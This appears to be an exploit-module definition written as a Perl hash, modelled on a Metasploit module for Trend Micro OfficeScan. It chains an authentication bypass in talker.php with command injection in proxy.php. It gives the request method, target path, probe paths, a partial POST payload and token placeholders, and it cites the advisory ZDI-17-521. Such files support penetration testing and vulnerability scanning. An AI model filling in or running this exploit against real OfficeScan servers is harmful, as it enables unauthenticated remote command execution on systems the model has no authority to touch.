my $EXPLOIT = {
  CTYPE       => "application/x-www-form-urlencoded; charset=utf-8",
  DESCRIPTION => "

        This module exploits the authentication bypass and command injection vulnerability together. Unauthenticated users can execute a

        terminal command under the context of the web server user.



        The specific flaw exists within the management interface, which listens on TCP port 443 by default. The Trend Micro Officescan product

        has a widget feature which is implemented with PHP. Talker.php takes ack and hash parameters but doesn't validate these values, which

        leads to an authentication bypass for the widget. Proxy.php files under the mod TMCSS folder take multiple parameters but the process

        does not properly validate a user-supplied string before using it to execute a system call. Due to combination of these vulnerabilities,

        unauthenticated users can execute a terminal command under the context of the web server user.

      ",
  METHOD      => "POST",
  MSF_MODULE  => "trendmicro_officescan_widget_exec",
  PATH        => "officescan/console/html/widget/ui/modLogin/talker.php?",
  PATHS       => [
                   "officescan/console/html/widget/package.json",
                   "officescan/console/html/widget/index.php",
                   "officescan/console/html/widget/ui/modLogin/talker.php",
                   "officescan/console/html/widget/proxy_controller.php",
                   "",
                 ],
  PAYLOAD     => "module=modTMCSS&serverid=1&TOP=&",
  REFERENCES  => [
                   "https://pentest.blog/one-ring-to-rule-them-all-same-rce-on-multiple-trend-micro-products/",
                   "http://www.zerodayinitiative.com/advisories/ZDI-17-521/",
                 ],
  VARIABLES => {
    'HASH' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The URI of the Trend Micro OfficeScan management interface",
  VALUE => "/",
},
    'CSRF_TOKEN' =>       { DESCRIPTION => "", VALUE => "" },
    'TOKEN' =>       { DESCRIPTION => "", VALUE => "" },
  },
